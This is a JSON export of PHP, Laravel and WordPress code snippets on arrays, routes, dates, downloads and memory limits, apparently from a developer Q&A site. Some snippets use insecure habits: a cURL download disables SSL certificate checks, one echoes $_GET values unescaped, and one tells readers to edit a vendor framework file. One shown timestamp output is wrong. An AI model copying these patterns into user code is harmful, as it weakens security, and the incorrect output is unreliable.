    "description": "<?php $inputfile = file(\"prod.txt\");  $data_lines = array(); foreach ($inputfile as $line) {     $data_lines[] = explode(\";\", $line); }  //Get column headers. $first_line = array(); foreach ($data_lines[0] as $dl) {     $first_line[] = explode(\"=\", $dl); } $headers = array(); foreach ($first_line as $fl) {     $headers[] = $fl[0]; }  // Get row content. $data_cells = array(); for ($i = 0; $i < count($data_lines); $i++) {     $data_cell = array();     for ($j = 0; $j < count($headers); $j++)     {         $data_cell[$j] = substr($data_lines[$i][$j], strpos($data_lines[$i][$j], \"=\")+1);     }     $data_cells[$i] = $data_cell;     unset($data_cell); } ?> <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"> <html>     <head>         <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">         <title>HTML Table With PHP</title>     </head>     <body>         <table border=\"1\">             <tr>             <?php foreach ($headers as $header): ?>                 <th><?php echo $header; ?></th>             <?php endforeach; ?>             </tr>         <?php foreach ($data_cells as $data_cell): ?>             <tr>             <?php for ($k = 0; $k < count($headers); $k++): ?>                 <td><?php echo $data_cell[$k]; ?></td>             <?php endfor; ?>             </tr>         <?php endforeach; ?>         </table>     </body> </html> \n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 97,
    "keyword": null,
    "link": null,
    "title": " Create and Print Array in Laravel",
    "description": "        @php             var_dump($arr);         @endphp \nIn App -> project.php modal file       // NOTE: service #1 : General Translation     public static function translationTypes()     {         return collect([           [             'id' => '1',             'en_title' => 'Medical',           ],           [             'id' => '2',             'en_title' => 'General',           ],           [             'id' => '3',             'en_title' => 'Commercial',           ],           [             'id' => '4',             'en_title' => 'Literary',           ],         ]);     }   In Controller              $translationTypes = Project::translationTypes();  In View                   @foreach($translationTypes as $translationType)                 <option value=\"{{$translationType['id']}}\">{{ $translationType['en_title'] }}</option>                 @endforeach  \n@foreach ($watchFolder as $w)     {{ $w->name }}     @endforeach \n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 98,
    "keyword": null,
    "link": null,
    "title": " Creating a Basic Route in Laravel 8",
    "description": "use App\\Http\\Controllers\\PagesController;  // Create route for About Page Route::get('about-us', [PagesController::class, 'aboutPage'])->name('pages.about');\nRoute::get(     '/user/profile',     [UserProfileController::class, 'show'] )->name('profile');\nRoute::match(['get', 'post'], '/', function () {     // });\n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 99,
    "keyword": null,
    "link": null,
    "title": " Creating default object from empty value",
    "description": "$res = new \\stdClass(); $res->success = false;\n// This message has been E_STRICT for PHP <= 5.3. Since PHP 5.4, it was unluckilly changed to E_WARNING. Since E_WARNING messages are useful, you don't want to disable them completely. // To get rid of this warning, you must use this code:  if (!isset($res))      $res = new stdClass();  $res->success = false;  // this code is from @TMS' answer on the source\n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 100,
    "keyword": null,
    "link": null,
    "title": " Cross-site request forgery validation failed. Required param \"state\" missing from persistent data",
    "description": "//At the top of both scripts (Facebook and login_page.php) add the follow: if(!session_id()) {     session_start(); } \n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 101,
    "keyword": null,
    "link": null,
    "title": " Custom Order By in CakePHP",
    "description": "// In mysql you can order by specific field values, by using ORDER BY FIELD: SELECT * FROM city  WHERE id IN (10, 1, 2) ORDER BY FIELD(id, 10, 1, 2) DESC;  // output: // order: first those with id = 10, those with id = 1, those with id = 2 // Do in cake \t'order' => array( \t\t'FIELD(City.id, 10, 1, 2)', \t),  // or     'order' => array( \t\t'FIELD(City.id, 10, 1, 2) DESC', \t),   \n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 102,
    "keyword": null,
    "link": null,
    "title": " DB::statement('SET GLOBAL group concat max len =",
    "description": "DB::statement('SET GLOBAL group_concat_max_len = 1000000');\n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 103,
    "keyword": null,
    "link": null,
    "title": " DateTime and Timestamps",
    "description": "$dateTime = new DateTime('2016-05-20'); echo $dateTime->getTimestamp();  # Output: 1271802325\n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 104,
    "keyword": null,
    "link": null,
    "title": " Date time format for laravel validation",
    "description": " $request->validate([         'start_date' => 'date_format:d/m/Y',         'end_date' => 'date_format:d/m/Y'     ]);\n'dob' => 'required|date_format:Y-m-d|after_or_equal:1920-01-01'\n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 105,
    "keyword": null,
    "link": null,
    "title": " Datetime to string php",
    "description": "$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date);\n <?php $date = new DateTime('2000-01-01'); echo $date->format('Y-m-d H:i:s'); ?>  \n<?php $date = '27/06/2020, 04:42:43 PM'; $date = str_replace('/', '-', $date); echo date('F j, Y, g:i a',strtotime($date));  // output : June 27, 2020, 4:42 pm ?>\nDate to string  $date = \"2021/03/13\"; $newdate= date('d M, Y', strtotime($date)); echo $newdate;\n$old_date = date('l, F d y h:i:s');              // returns Saturday, January 30 10 02:06:34 $old_date_timestamp = strtotime($old_date); $new_date = date('Y-m-d H:i:s', $old_date_timestamp);    \nphpCopy$theDate    = new DateTime('2020-03-08'); echo $stringDate = $theDate->format('Y-m-d H:i:s');  //output: 2020-03-08 00:00:00 \n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 106,
    "keyword": null,
    "link": null,
    "title": " Definir una constante para llamar archivos en puglins de WordPress",
    "description": "define( 'MY_PLUGIN_PATH', plugin_dir_path( __FILE__ ) ); include( MY_PLUGIN_PATH . 'includes/admin-page.php'); include( MY_PLUGIN_PATH . 'includes/classes.php'); // etc. \n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 107,
    "keyword": null,
    "link": null,
    "title": " Delete Query with Where Condition in Codeigniter",
    "description": " \t$this->db->where('id', 2);\t \t$this->db->delete('table_name'); \t\n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 108,
    "keyword": null,
    "link": null,
    "title": " Delete quotes in php",
    "description": "str_replace('\"', \"\", $string);\n// Provides: Hll Wrld f PHP $vowels = array(\"a\", \"e\", \"i\", \"o\", \"u\", \"A\", \"E\", \"I\", \"O\", \"U\"); $onlyconsonants = str_replace($vowels, \"\", \"Hello World of PHP\");\n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 109,
    "keyword": null,
    "link": null,
    "title": " Deleting an element from an array in PHP",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]); //Key which you want to delete /* $array: [     [0] => a     [2] => c ] */ //OR $array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; array_splice($array, 1, 1);//Offset which you want to delet /* $array: [     [0] => a     [1] => c ] */\n$arr = array('a' => 1, 'b' => 2, 'c' => 3); unset($arr['b']);  // RESULT: array('a' => 1, 'c' => 3)  $arr = array(1, 2, 3); array_splice($arr, 1, 1);  // RESULT: array(0 => 1, 1 => 3)\nphp remove from array\n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 110,
    "keyword": null,
    "link": null,
    "title": " Difference between echo and print statement in php",
    "description": "Source link: https://www.programmingquest.com/2019/04/difference-between-echo-and-print.html  1. echo Statement * we can write echo statement with parenthesis like 'echo()' or without parenthesis 'echo'. * In the echo we can pass multiple variable in comma separated form to see the output like 'echo $a,$b,$c;' * echo doesn&rsquo;t return any value * echo is faster then print  2. Print Statement * we can write print statement with parenthesis like 'print()' or without parenthesis 'print'. * In the print we can not pass multiple variable in comma separated form like echo. * print statement always returns 1. * print is slower than echo\n",
    "reg_date": "2021-10-12T10:12:12.000Z"
  },
  {
    "id": 111,
    "keyword": null,
    "link": null,
    "title": " Disable Bitnami Banner Wordpress",
    "description": "sudo /opt/bitnami/apps/APPNAME/bnconfig --disable_banner 1  If you&rsquo;re using Apache, execute the command below:  sudo /opt/bitnami/ctlscript.sh restart apache  If you&rsquo;re using NGINX, execute the command below:  sudo /opt/bitnami/ctlscript.sh restart nginx \nsudo /opt/bitnami/apps/APPNAME/bnconfig --disable_banner 1 \n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 112,
    "keyword": null,
    "link": null,
    "title": " Download a file from external server using PHP - Move one project to another server",
    "description": "<?php // It will copy one server file to another server and beleive me,  // it would jist take 1 second for 100MB file.  // May be for 1GB = 10 seconds highest.  // It's very useful to move cPanel file to another cPanel server    // Create a file download.php in current server. file_put_contents(\"download.zip\", fopen(\"file_url\", 'r'));  // Example would be file_put_contents(\"download.zip\", fopen(\"https://another.com/project.zip\", 'r')); // https://another.com/project.zip is the file stored in another server with read access  // Then Just browse the file from current server, where needs to be added // https://current.com/download.php  // And Boooooooooooom !!!! Go to current server and check copy of the // Previous server file has been added in this server.  ?>\n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 113,
    "keyword": null,
    "link": null,
    "title": " Download file from another server in PHP",
    "description": "<?php     $curl = curl_init();      // URL to Download File     $url = \"https://wallpapercave.com/wp/wp2663986.png\";              // Get File name from URL ( Last string from url)     $string = explode('/', $url);     $last_word = array_pop($string);          // Download Path      $path = 'images/' . $last_word;  // images folder must already exist.     $myfile = fopen( $path , 'w+');      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);     curl_setopt($curl, CURLOPT_URL, $url);     curl_setopt($curl, CURLOPT_FILE, $myfile);      $data = curl_exec($curl);          if ($data)       {         echo \"Download Completed <br>\";         echo \"Output :  $path <br>\";         echo \"File Name :  $last_word <br>\";         echo \"URL :  $url <br>\" ;       }     $err = curl_error($curl);     echo $err;     curl_close($curl);   ?>\n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 114,
    "keyword": null,
    "link": null,
    "title": " Download multiple files as zip in PHP",
    "description": "<?php  /* create a compressed zip file */ function createZipArchive($files = array(), $destination = '', $overwrite = false) {     if(file_exists($destination) && !$overwrite) { return false; }     $validFiles = array();    if(is_array($files)) {       foreach($files as $file) {          if(file_exists($file)) {             $validFiles[] = $file;          }       }    }     if(count($validFiles)) {       $zip = new ZipArchive();       if($zip->open($destination,$overwrite ? ZIPARCHIVE::OVERWRITE : ZIPARCHIVE::CREATE) == true) {          foreach($validFiles as $file) {             $zip->addFile($file,$file);          }          $zip->close();          return file_exists($destination);       }else{           return false;       }    }else{       return false;    } }  $fileName = 'myzipfile.zip'; $files = array('uploads/profile1.jpeg', 'uploads/profile2.jpeg'); $result = createZipArchive($files, $fileName);  header(\"Content-Disposition: attachment; filename=\\\"\".$fileName.\"\\\"\"); header(\"Content-Length: \".filesize($fileName)); readfile($fileName);  ?> \n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 115,
    "keyword": null,
    "link": null,
    "title": " Dropzone Attachment Preview",
    "description": "  init: function () {       @if(isset($user) && $user->picture)         var file = {!! json_encode($user->picture) !!}             this.options.addedfile.call(this, file)         this.options.thumbnail.call(this, file, file.preview)         file.previewElement.classList.add('dz-complete')         $('form').append('<input type=\"hidden\" name=\"picture\" value=\"' + file.file_name + '\">')         // NOTE: Adding the Download link         var preview = document.createElement('a');         preview.setAttribute('href',file.preview);         preview.setAttribute('target','_blank');         preview.setAttribute('class','fa fa-file');         preview.innerHTML = \" Preview\";         file.previewTemplate.appendChild(preview);         // NOTE: Adding the Download link (END)         this.options.maxFiles = this.options.maxFiles - 1       @endif     }, \n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 116,
    "keyword": null,
    "link": null,
    "title": " E: Couldn't find any package by regex 'php7.2-json'",
    "description": "sudo apt-add-repository ppa:ondrej/php sudo apt-get update sudo apt-get install php7.0 \n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 117,
    "keyword": null,
    "link": null,
    "title": " E: Unable to locate package php7.2-mbstring",
    "description": "sudo add-apt-repository \"deb http://archive.ubuntu.com/ubuntu $(lsb_release -sc) universe\" \n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 118,
    "keyword": null,
    "link": null,
    "title": " ERROR 1071 (42000) at line 76: Specified key was too long; max key length is 767 bytes laravel",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \n// Update your /app/Providers/AppServiceProvider.php to contain:  use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }  //ON this error  //   PDOException::(\"SQLSTATE[42S01]: Base table or view already exists: 1050 Table 'users' already exists\") // After run ->  php artisan migrate:fresh  <- ! Note this will reset all tables in db\n'charset' => 'utf8', 'collation' => 'utf8_unicode_ci',\n'charset' => 'utf8mb4', 'collation' => 'utf8mb4_unicode_ci',\n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 119,
    "keyword": null,
    "link": null,
    "title": " Encabezado de complemento en WordPress",
    "description": "/**  * Plugin Name:       My Basics Plugin  * Plugin URI:        https://example.com/plugins/the-basics/  * Description:       Handle the basics with this plugin.  * Version:           1.10.3  * Requires at least: 5.2  * Requires PHP:      7.2  * Author:            John Smith  * Author URI:        https://author.example.com/  * License:           GPL v2 or later  * License URI:       https://www.gnu.org/licenses/gpl-2.0.html  * Update URI:        https://example.com/my-plugin/  * Text Domain:       my-basics-plugin  * Domain Path:       /languages  */ \n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 120,
    "keyword": null,
    "link": null,
    "title": " Error: Cannot find module 'webpack/lib/rules/DescriptionDataMatcherRulePlugin",
    "description": "To fix the issue I used : npm i vue-loader\nnpm i vue-loader\n",
    "reg_date": "2021-10-12T10:12:13.000Z"
  },
  {
    "id": 121,
    "keyword": null,
    "link": null,
    "title": " Error: Cannot redeclare composerRequire1d8e02dff94f518b7a14ddcb6710f10d() (previously declared in /Applications/XAMPP/xamppfiles/htdocs/all4learn2/Vendor/composer/autoload real.php:66)",
    "description": "change class name is okay \n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 122,
    "keyword": null,
    "link": null,
    "title": " Error: Cookies are blocked or not supported by your browser. You must enable cookies to use WordPress.",
    "description": "#in wp-config.php  define('COOKIE_DOMAIN', $_SERVER['HTTP_HOST'] );   #https://www.fiverr.com/tamerjarrar\n you&rsquo;ll need to open your website&rsquo;s function.php file.    Then add the following code:   setcookie(TEST_COOKIE, 'WP Cookie check', 0, COOKIEPATH, COOKIE_DOMAIN); if ( SITECOOKIEPATH != COOKIEPATH ) setcookie(TEST_COOKIE, 'WP Cookie check', 0, SITECOOKIEPATH, COOKIE_DOMAIN); and then save/upload your functions.php file.   #https://www.fiverr.com/shadabdeveloper\n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 123,
    "keyword": null,
    "link": null,
    "title": " ErrorExceptionUndefined array key \"password\"",
    "description": "1. open path\\to\\vendor\\laravel\\framework\\src\\Illuminate\\Auth\\EloquentUserProvider.php  2. find all \"password\" value  3. replace all \"password\" value to match your database user table \"password\" field 4. save that  and make sure your password is generated by hash\n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 124,
    "keyword": null,
    "link": null,
    "title": " Example wp-config.php for Debugging",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 125,
    "keyword": null,
    "link": null,
    "title": " Extract Numbers From a String in PHP",
    "description": "$str = 'In My Cart : 11 items'; $int = (int) filter_var($str, FILTER_SANITIZE_NUMBER_INT);\nphpCopy<?php  $string = 'Sarah has 4 dolls and 6 bunnies.'; $outputString = preg_replace('/[^0-9]/', '', $string);   echo(\"The extracted numbers are: $outputString \\n\");  ?>  \nphpCopy<?php  $string = 'Sarah has 4 dolls and 6 bunnies.'; $int = (int) filter_var($string, FILTER_SANITIZE_NUMBER_INT);   echo(\"The extracted numbers are: $int \\n\");  ?>  \nphpCopy<?php  $string = 'Sarah has 4 dolls and 6 bunnies.'; preg_match_all('!\\d+!', $string, $matches); print_r($matches);  ?>  \n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 126,
    "keyword": null,
    "link": null,
    "title": " Extract images from a folder in php",
    "description": "<?php function rasmname(){  $dirname = \"./\";  $images = glob($dirname.\"*.jpg\"); foreach($images as $image) {  echo '<img src=\"'.$image.'\" /><br />';   } } rasmname();\n<?php  echo scanDirectoryImages(\"uploads\");  /** * Recursively search through directory for images and display them *  * @param  array  $exts * @param  string $directory * @return string */ function scanDirectoryImages($directory, array $exts = array('jpeg', 'jpg', 'gif', 'png')) { if (substr($directory, -1) == '/') {     $directory = substr($directory, 0, -1); } $html = ''; if (     is_readable($directory)     && (file_exists($directory) || is_dir($directory)) ) {     $directoryList = opendir($directory);     while($file = readdir($directoryList)) {         if ($file != '.' && $file != '..') {             $path = $directory . '/' . $file;             if (is_readable($path)) {                 if (is_dir($path)) {                     return scanDirectoryImages($path, $exts);                 }                 if (                     is_file($path)                     && in_array(end(explode('.', end(explode('/', $path)))),   $exts)                 ) {                     $html .= '<a href=\"' . $path . '\"><img src=\"' . $path                         . '\" style=\"max-height:100px;max-width:100px\" />  </a>';                 }             }         }     }     closedir($directoryList); } return $html; }\n<html>  <head>  <title>display image</title>  </head>  <body>  <p>Here in your form and text</p> \t<?php   \techo \"<img src='image-name.png' >\";   \t?>    </body>  </html>\n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 127,
    "keyword": null,
    "link": null,
    "title": " Failed to connect to github.com port 443: Connection timed out",
    "description": "/* In Depth Answers @StackOverFlow : https://stackoverflow.com/questions/18356502/github-failed-to-connect-to-github-443-windows-failed-to-connect-to-github    Option 1 for Windows users : Restart your machine  Option 2 : Try unsetting your proxy. In my case this worked. */ git config --global --unset https.proxy\n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 128,
    "keyword": null,
    "link": null,
    "title": " Fatal error: Allowed memory size of 1610612736 bytes exhausted",
    "description": "export COMPOSER_MEMORY_LIMIT=-1\nset COMPOSER_MEMORY_LIMIT=-1 \nphp -d memory_limit=-1 composer.phar require hwi/oauth-bundle php-http/guzzle6-adapter php-http/httplug-bundle \nphp -d memory_limit=-1 /usr/local/bin/composer install  \nphp --ini  nano /etc/php5/cli/php.ini (it could be different for you)  Search for memory_limit by (ctrl + w)    make memory_limit to -1 or 2G (depending on what you can increase to)    save by (ctrl + x) then enter \nFatal error: Allowed memory size of 1610612736 bytes exhausted  export COMPOSER_MEMORY_LIMIT=-1 and restart composer update \n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 129,
    "keyword": null,
    "link": null,
    "title": " Fatal error: Allowed memory size of 536870912 bytes exhausted (tried to allocate 119541600 bytes) in C:\\xampp\\htdocs\\backup-vice.php on line 67",
    "description": "php --ini  nano /etc/php5/cli/php.ini (it could be different for you)  Search for memory_limit by (ctrl + w)    make memory_limit to -1 or 2G (depending on what you can increase to)    save by (ctrl + x) then enter \n<?php  ini_set('memory_limit', '1024M'); // or you could use 1G  ?>\nFatal error: Allowed memory size of 1610612736 bytes exhausted  export COMPOSER_MEMORY_LIMIT=-1 and restart composer update \nIn my case with Xampp with Windows 10  i just changed:  ;memory_limit=512M  by commenting this configuration, in php.ini to:  memory_limit =-1 \nmemory_limit = 64M;\n",
    "reg_date": "2021-10-12T10:12:14.000Z"
  },
  {
    "id": 130,
    "keyword": null,
    "link": null,
    "title": " Fatal error: Cannot redeclare",
    "description": "if (!function_exists('your_function_name'))   {   function your_function_name()  {     ........   } }\n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 131,
    "keyword": null,
    "link": null,
    "title": " Fatal error: Exception thrown without a stack frame in Unknown on line  php",
    "description": "#check whether anywhere in class you might be missing ; , {, } something else\n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 132,
    "keyword": null,
    "link": null,
    "title": " Fatal error: Maximum execution time of 120 seconds exceeded in",
    "description": "//change this in php.ini  max_execution_time = 500\n// you need to add this line at the bottom of your .htaccess file Before # END WordPress Like this...  php_value max_execution_time 1000 # END WordPress\n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 133,
    "keyword": null,
    "link": null,
    "title": " Fatal error: Uncaught Error: Undefined constant \"SECURE\"",
    "description": "Fatal error: Uncaught Error: Undefined constant \"SECURE\" \n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 134,
    "keyword": null,
    "link": null,
    "title": " Fatal error: Uncaught ReflectionException: Class config does not exist in",
    "description": "cd bootstrap/cache/ rm -rf *.php \n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 135,
    "keyword": null,
    "link": null,
    "title": " Find ip address location php",
    "description": "$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n//You can use an api: //Link to documentation: https://ip-get-geolocation.com/documentation/  $LocationArray = json_decode( file_get_contents('http://ip-get-geolocation.com/api/json/35.188.125.133'), true); \t  echo $LocationArray['country']; \t echo $LocationArray['city']; \t echo $LocationArray['region']; \t echo $LocationArray['timezone']; \n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 136,
    "keyword": null,
    "link": null,
    "title": " Foreach limit laravel",
    "description": "@foreach ($element['subs']->slice(0, 10) as $item)  ...Code @endforeach \n@foreach ($users->slice(0, 5) as $user)    {{$user->option1}} <br>  @endforeach  \n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 137,
    "keyword": null,
    "link": null,
    "title": " Function create function() is deprecated in",
    "description": "//From create_function( '$caps', \"return '$caps';\" );  //To function($caps) {return $caps;}\n//change create_function to anonymous like so: //change: $square = create_function('$x', 'return pow($x,2);'); //to: $square = function($x){ \treturn pow($x,2); };\n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 138,
    "keyword": null,
    "link": null,
    "title": " General error: 1215 Cannot add foreign key constraint laravel",
    "description": "Laravel 5.8 Added bigIncrements As Defaults  So there is mismatch in foreign key field types. You see bigIncrements(id) in  User table and unsigned Integer(user_id) in questions table.  How to fix:  1. Either change original migration from bigIncrements() to just increments()  2. Or in your foreign key column do unsignedBigInteger() instead of  unsignedInteger().\n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 139,
    "keyword": null,
    "link": null,
    "title": " Get Current Page URL in PHP",
    "description": "<?php $uri = $_SERVER['REQUEST_URI']; echo $uri; // Outputs: URI   $protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? \"https://\" : \"http://\";  $url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; echo $url; // Outputs: Full URL   $query = $_SERVER['QUERY_STRING']; echo $query; // Outputs: Query String ?>\n<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?> \n<?php       if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')             $url = \"https://\";        else            $url = \"http://\";        // Append the host(domain name, ip) to the URL.        $url.= $_SERVER['HTTP_HOST'];             // Append the requested resource location to the URL        $url.= $_SERVER['REQUEST_URI'];                echo $url;     ?>   \n$protocol = strpos(strtolower($_SERVER['SERVER_PROTOCOL']),'https') === FALSE ? 'http' : 'https'; $host     = $_SERVER['HTTP_HOST']; $script   = $_SERVER['SCRIPT_NAME']; $params   = $_SERVER['QUERY_STRING'];   $currentUrl = $protocol . '://' . $host . $script . '?' . $params;   echo $currentUrl;\n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 140,
    "keyword": null,
    "link": null,
    "title": " Get Parameters From a URL String in PHP",
    "description": "phpCopy<?php  echo $_GET['email'] . $_GET['name'] ?>  \nphpCopy<?php  $url = \"https://testurl.com/test/1234?email=abc@test.com&name=sarah\"; $components = parse_url($url); parse_str($components['query'], $results); print_r($results);  ?>  \nphpCopy<?php  $url = \"https://testurl.com/test/1234?email=abc@test.com&name=sarah\"; $components = parse_url($url); parse_str($components['query'], $results); echo($results['email']);  ?>  \nphpCopy<?php  $url = \"https://testurl.com/test/1234?email=abc@test.com&name=sarah\"; $components = parse_url($url, PHP_URL_QUERY); //$component parameter is PHP_URL_QUERY parse_str($components, $results); print_r($results);  ?>  \n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 141,
    "keyword": null,
    "link": null,
    "title": " Get color code from string",
    "description": "function getColour($seed, $rgbArray = false) {     $hash = md5($seed);     $r = hexdec(substr($hash, 0, 2));     $g = hexdec(substr($hash, 2, 2));     $b = hexdec(substr($hash, 4, 2));     if ($rgbArray) {         return array('R' => $r, 'G' => $g, 'B' => $b);     }     $highR = $r + 10;     $highG = $g + 10;     $highB = $b + 10;     $main = '#' . str_pad(dechex($r), 2, '0', STR_PAD_LEFT)         . str_pad(dechex($g), 2, '0', STR_PAD_LEFT)         . str_pad(dechex($b), 2, '0', STR_PAD_LEFT);     $highlight = '#' . dechex($highR) . dechex($highG) . dechex($highB);     return array('main' => $main, 'highlight' => $highlight); }  $t = getColour('Assigned');\n",
    "reg_date": "2021-10-12T10:12:15.000Z"
  },
  {
    "id": 142,
    "keyword": null,
    "link": null,
    "title": " Get last id in laravel",
    "description": "// how to get last inserted id in laravel  //METHOD-1 $data->save(); $lastId = $data->id;  //METHOD-2 $data = Booking::latest('id')->first(); $id = data->id;\n$last3 = DB::table('items')->latest('id')->first();\nDB::getPdo()->lastInsertId(); \n$id = DB::table('users')    ->insertGetId(  \t  ['name' => 'Akash Savani', 'email'=>'akash@gmail.com']  );\n$last2 = DB::table('items')->orderBy('id', 'DESC')->first();\n$last = DB::table('items')->latest()->first();\n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 143,
    "keyword": null,
    "link": null,
    "title": " Get the Current Date and Time in PHP",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\ndate_default_timezone_set('Asia/Kolkata');  echo date(\"Y-m-d H:i:s\"); // time in India\nphpCopy<?php $DateAndTime = date('m-d-Y h:i:s a', time());   echo \"The current date and time are $DateAndTime.\"; ?> \nphpCopy<?php $Object = new DateTime();   $DateAndTime = $Object->format(\"d-m-Y h:i:s a\");   echo \"The current date and time are $DateAndTime.\"; ?> \nphpCopy<?php date_default_timezone_set('Europe/Amsterdam');     $DateAndTime = date('m-d-Y h:i:s a', time());   echo \"The current date and time in Amsterdam are $DateAndTime.\\n\"; date_default_timezone_set('America/Toronto');     $DateAndTime2 = date('m-d-Y h:i:s a', time());   echo \"The current date and time in Toronto are $DateAndTime2.\"; ?> \nphpCopy<?php $Object = new DateTime();   $Object->setTimezone(new DateTimeZone('Europe/Amsterdam')); $DateAndTime = $Object->format(\"d-m-Y h:i:s a\");   echo \"The current date and time in Amsterdam are $DateAndTime.\\n\"; $Object->setTimezone(new DateTimeZone('America/Toronto')); $DateAndTime = $Object->format(\"d-m-Y h:i:s a\");   echo \"The current date and time in Toronto are $DateAndTime.\"; ?> \n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 144,
    "keyword": null,
    "link": null,
    "title": " Get the content of a specific page (by ID)",
    "description": "\t$id=352;  \t$post = get_post($id);  \t$content = apply_filters('the_content', $post->post_content);  \techo $content;  \n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 145,
    "keyword": null,
    "link": null,
    "title": " Get the current page address",
    "description": "$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\"; \n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 146,
    "keyword": null,
    "link": null,
    "title": " Get the number of days between two dates in PHP",
